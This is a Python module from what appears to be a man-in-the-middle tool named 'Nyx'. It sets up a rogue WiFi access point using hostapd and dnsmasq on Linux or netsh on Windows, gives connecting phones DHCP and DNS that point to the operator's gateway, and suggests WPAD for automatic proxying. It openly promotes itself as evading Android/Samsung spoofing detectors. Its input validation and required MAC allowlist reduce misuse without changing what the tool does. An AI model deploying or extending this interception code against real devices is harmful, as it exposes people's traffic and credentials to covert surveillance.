"""WiFi Access Point / hotspot mode — the ultimate MITM bypass.

When a laptop turns its WiFi card into an Access Point, the target phone
connects to *us* and we become the legitimate DHCP server + gateway. There
is nothing to spoof — no ARP flooding, no NDP poisoning, no DHCP race. The
target simply routes through us the way it would through any router, so
Android/Samsung's "suspicious activity" detectors never fire (they detect
*spoofed* responses, not a normal router).

How it works per platform:
  - Linux:  hostapd (AP) + dnsmasq (DHCP/DNS) — the classic stack.
  - Windows: `netsh wlan set hostednetwork` (legacy) or the Windows Mobile
    Hotspot API via PowerShell. Falls back gracefully if the driver does not
    support hosted network.
  - macOS:  Internet Sharing via `networksetup`.

This module is **opportunistic**: it probes the platform capabilities and
returns a clear "not supported" if the wireless driver can't do it. The MITM
UI offers AP mode as an option; if unavailable it explains why.
"""
import asyncio
import logging
import platform
import re
import shutil
import subprocess
import tempfile
from pathlib import Path

logger = logging.getLogger(__name__)

_SSID = "Nyx"
_PASSPHRASE = "nyxmitm2026"
_SUBNET = "192.168.42.0/24"
_GATEWAY = "192.168.42.1"
_DHCP_RANGE = "192.168.42.10,192.168.42.100,12h"

# These values reach shell-adjacent calls (netsh) and generated hostapd.conf
# lines. They are validated at the API boundary AND here, so the manager is
# safe even when someone constructs it directly from a script or a plugin.
# - SSID: printable ASCII except the double quote (would break netsh quoting);
#   no CR/LF/NUL (would inject hostapd.conf directives on Linux).
# - Passphrase: WPA requires 8-63 chars; restricting the alphabet also keeps
#   the value out of shell/config metacharacters.
_SSID_RE = re.compile(r'^[^\x00-\x1f\x7f"]{1,32}$')
_PASSPHRASE_RE = re.compile(r"^[A-Za-z0-9!@#$%^&*._-]{8,63}$")
_IFACE_RE = re.compile(r"^[A-Za-z0-9_.:-]{1,32}$")
_MAC_RE = re.compile(r"^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}$")


def validate_mac_list(macs: list[str]) -> list[str]:
    """Normalise and validate an AP target allowlist.

    An empty allowlist is rejected by the manager: a target-scoped AP that
    accepts everyone is exactly the unethical-by-default behaviour this
    feature is supposed to remove.
    """
    cleaned = []
    for mac in macs or []:
        value = str(mac).strip().upper()
        if not _MAC_RE.match(value):
            raise ValueError(f"Invalid MAC address in AP allowlist: {mac!r}")
        if value not in cleaned:
            cleaned.append(value)
    return cleaned


def validate_ssid(value: str) -> str:
    if not isinstance(value, str) or not _SSID_RE.match(value):
        raise ValueError(
            "SSID must be 1-32 printable characters and must not contain "
            "quotes or control characters"
        )
    return value


def validate_passphrase(value: str) -> str:
    if not isinstance(value, str) or not _PASSPHRASE_RE.match(value):
        raise ValueError(
            "WPA passphrase must be 8-63 characters from "
            "[A-Za-z0-9!@#$%^&*._-]"
        )
    return value


def validate_iface(value: str) -> str:
    if not isinstance(value, str) or not _IFACE_RE.match(value):
        raise ValueError(f"Unsafe network interface name: {value!r}")
    return value


class WiFiAPError(Exception):
    """Raised when AP mode cannot be started on this platform."""


def _platform() -> str:
    return platform.system().lower()


def is_supported() -> dict:
    """Probe whether AP mode is possible on this machine.

    Returns a dict with ``supported`` bool and a human-readable ``reason``.
    """
    sys_platform = _platform()
    if sys_platform == "linux":
        if shutil.which("hostapd") and shutil.which("dnsmasq"):
            return {"supported": True, "reason": "hostapd + dnsmasq available"}
        return {
            "supported": False,
            "reason": "Linux AP mode requires hostapd + dnsmasq. "
            "Install: sudo apt install hostapd dnsmasq",
        }
    if sys_platform == "windows":
        # Probe hostednetwork support via netsh (works on most Intel/Realtek).
        try:
            out = subprocess.check_output(
                "netsh wlan show drivers", shell=True, timeout=8,
                stderr=subprocess.DEVNULL,
            ).decode("utf-8", errors="replace")
            if "Hosted network supported" in out and "Yes" in out:
                return {"supported": True, "reason": "Windows hosted network available"}
            return {
                "supported": False,
                "reason": "Wireless driver does not support hosted network. "
                "Use Windows 'Mobile Hotspot' manually, or use Linux with hostapd.",
            }
        except Exception as e:
            return {"supported": False, "reason": f"Could not probe: {e}"}
    if sys_platform == "darwin":
        return {
            "supported": True,
            "reason": "macOS Internet Sharing (enable manually in System Settings)",
        }
    return {"supported": False, "reason": f"Unsupported platform: {sys_platform}"}


class WiFiAPManager:
    """Start/stop a rogue access point with DHCP so targets route through us."""

    def __init__(
        self,
        ssid: str = _SSID,
        passphrase: str = _PASSPHRASE,
        allowed_macs: list[str] | None = None,
    ):
        try:
            self.ssid = validate_ssid(ssid)
            self.passphrase = validate_passphrase(passphrase)
            self.allowed_macs = (
                None if allowed_macs is None else validate_mac_list(allowed_macs)
            )
        except ValueError as exc:
            raise WiFiAPError(str(exc)) from exc
        if self.allowed_macs == []:
            raise WiFiAPError(
                "Refusing to start a target-scoped AP with an empty allowlist"
            )
        self._accept_file: str | None = (
            str(Path(tempfile.gettempdir()) / "nyx_hostapd_accept.conf")
            if self.allowed_macs is not None else None
        )
        self._running = False
        self._proc: subprocess.Popen | None = None
        self._dnsmasq_proc: subprocess.Popen | None = None
        self._hostapd_conf: str | None = None
        self._dnsmasq_conf: str | None = None

    async def start(self) -> dict:
        """Start the AP. Returns status dict. Raises WiFiAPError on failure."""
        sys_platform = _platform()
        if sys_platform == "linux":
            return await self._start_linux()
        if sys_platform == "windows":
            return await self._start_windows()
        if sys_platform == "darwin":
            raise WiFiAPError(
                "macOS AP mode requires manual Internet Sharing setup."
            )
        raise WiFiAPError(f"Unsupported platform: {sys_platform}")

    async def stop(self) -> None:
        """Tear down the AP and restore the interface."""
        self._running = False
        if self._proc:
            try:
                self._proc.terminate()
                await asyncio.wait_for(asyncio.to_thread(self._proc.wait), timeout=5)
            except Exception:
                try:
                    self._proc.kill()
                except Exception:
                    pass
            self._proc = None
        if self._dnsmasq_proc:
            try:
                self._dnsmasq_proc.terminate()
                await asyncio.wait_for(
                    asyncio.to_thread(self._dnsmasq_proc.wait), timeout=5
                )
            except Exception:
                try:
                    self._dnsmasq_proc.kill()
                except Exception:
                    pass
            self._dnsmasq_proc = None
        # Cleanup temp configs
        for path in (self._hostapd_conf, self._dnsmasq_conf, self._accept_file):
            if path:
                try:
                    Path(path).unlink(missing_ok=True)
                except Exception:
                    pass
        sys_platform = _platform()
        try:
            if sys_platform == "windows":
                subprocess.run(
                    ["netsh", "wlan", "stop", "hostednetwork"],
                    shell=False, timeout=10, capture_output=True,
                )
            elif sys_platform == "linux":
                for proc_name in ("hostapd", "dnsmasq"):
                    subprocess.run(
                        ["pkill", "-f", proc_name], shell=False, timeout=10,
                        capture_output=True,
                    )
        except Exception:
            pass
        self._hostapd_conf = None
        self._dnsmasq_conf = None
        logger.info("WiFi AP stopped")

    async def _start_linux(self) -> dict:
        """hostapd + dnsmasq on Linux. Requires root."""
        import os
        if os.geteuid() != 0:
            raise WiFiAPError(
                "Linux AP mode requires root. Run Nyx as root (sudo)."
            )
        iface = self._find_wifi_iface_linux()
        if not iface:
            raise WiFiAPError("No WiFi interface found for AP mode")
        iface = validate_iface(iface)

        # Target-scoped AP: hostapd serves only the MACs in the accept file,
        # and dnsmasq only leases to hosts it knows. Config is generated from
        # validated values (no user string is concatenated raw).
        if self._accept_file:
            Path(self._accept_file).write_text(
                "\n".join(self.allowed_macs or []) + "\n"
            )

        self._hostapd_conf = str(Path(tempfile.gettempdir()) / "nyx_hostapd.conf")
        Path(self._hostapd_conf).write_text(self._hostapd_config(iface))

        # dnsmasq config: DHCP + DNS pointing to our proxy
        self._dnsmasq_conf = str(Path(tempfile.gettempdir()) / "nyx_dnsmasq.conf")
        Path(self._dnsmasq_conf).write_text(self._dnsmasq_config(iface))

        try:
            subprocess.run(["ip", "link", "set", iface, "up"],
                           shell=False, check=True, timeout=10)
            subprocess.run(
                ["ip", "addr", "add", f"{_GATEWAY}/24", "dev", iface],
                shell=False, check=True, timeout=10,
            )
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"],
                           shell=False, timeout=10)
            self._proc = subprocess.Popen(
                ["hostapd", self._hostapd_conf],
                shell=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            )
            self._dnsmasq_proc = subprocess.Popen(
                ["dnsmasq", f"--conf-file={self._dnsmasq_conf}"],
                shell=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            )
            self._running = True
            return {
                "status": "ok",
                "mode": "wifi-ap",
                "ssid": self.ssid,
                "gateway": _GATEWAY,
                "dhcp_range": _DHCP_RANGE,
                "note": "Target connects to the 'Nyx' SSID — no spoofing, "
                "zero detection. Set the proxy to 192.168.42.1:8080 on the "
                "target, or use DHCP option 252 (WPAD) for automatic proxy.",
            }
        except Exception as e:
            raise WiFiAPError(f"Linux AP start failed: {e}")

    def _hostapd_config(self, iface: str) -> str:
        """Render hostapd.conf. Pure function: easy to assert in tests."""
        lines = [
            f"interface={iface}",
            f"ssid={self.ssid}",
            "hw_mode=g",
            "channel=6",
            "wmm_enabled=0",
            "macaddr_acl=1" if self.allowed_macs is not None else "macaddr_acl=0",
        ]
        if self._accept_file:
            lines.append(f"accept_mac_file={self._accept_file}")
        lines += [
            "auth_algs=1",
            "ignore_broadcast_ssid=0",
            "wpa=2",
            f"wpa_passphrase={self.passphrase}",
            "wpa_key_mgmt=WPA-PSK",
            "wpa_pairwise=TKIP",
            "rsn_pairwise=CCMP",
        ]
        return "\n".join(lines) + "\n"

    def _dnsmasq_config(self, iface: str) -> str:
        """Render dnsmasq.conf, including the DHCP allowlist when scoped."""
        lines = [
            f"interface={iface}",
            f"dhcp-range={_DHCP_RANGE}",
            f"dhcp-option=3,{_GATEWAY}",
            f"dhcp-option=6,{_GATEWAY}",
            "no-resolv",
            f"server={_GATEWAY}",
            "log-queries",
        ]
        if self.allowed_macs is not None:
            lines.append("dhcp-ignore=tag:!known")
            lines += [f"dhcp-host={mac}" for mac in self.allowed_macs]
        return "\n".join(lines) + "\n"

    async def _start_windows(self) -> dict:
        """Windows hosted network (netsh). Requires Administrator."""
        if self.allowed_macs is not None:
            raise WiFiAPError(
                "A target-scoped AP needs hostapd MAC filtering, which the "
                "Windows hosted-network API does not expose. Use Linux."
            )
        try:
            # Set the SSID/passphrase and start
            # Argument list + shell=False: an SSID can no longer break out of
            # the quoting and become a command (SEC-01).
            subprocess.run(
                ["netsh", "wlan", "set", "hostednetwork", "mode=allow",
                 f"ssid={self.ssid}", f"key={self.passphrase}"],
                shell=False, check=True, timeout=15, capture_output=True,
            )
            subprocess.run(
                ["netsh", "wlan", "start", "hostednetwork"],
                shell=False, check=True, timeout=15, capture_output=True,
            )
            self._running = True
            return {
                "status": "ok",
                "mode": "wifi-ap",
                "ssid": self.ssid,
                "gateway": "192.168.137.1",  # Windows default ICS gateway
                "dhcp_range": "192.168.137.10-192.168.137.100",
                "note": "Target connects to the 'Nyx' SSID. Windows Internet "
                "Connection Sharing (ICS) must be enabled on the WiFi adapter "
                "(Control Panel > Network > Adapter > Sharing).",
            }
        except subprocess.CalledProcessError as e:
            raise WiFiAPError(
                f"Windows hosted network failed (driver may not support it): {e}"
            )
        except Exception as e:
            raise WiFiAPError(f"Windows AP start failed: {e}")

    @staticmethod
    def _find_wifi_iface_linux() -> str | None:
        """Find a WiFi interface (wlan0, wlpXsY) on Linux."""
        try:
            out = subprocess.check_output(
                "ls /sys/class/net/", shell=True, timeout=5
            ).decode().split()
            for iface in out:
                if iface.startswith(("wlan", "wl", "wlp", "wifi")):
                    return iface
            # Fallback: iw dev
            out = subprocess.check_output(
                "iw dev 2>/dev/null | grep Interface | awk '{print $2}'",
                shell=True, timeout=5,
            ).decode().split()
            if out:
                return out[0]
        except Exception as e:
            logger.debug("WiFi iface detection failed: %s", e)
        return None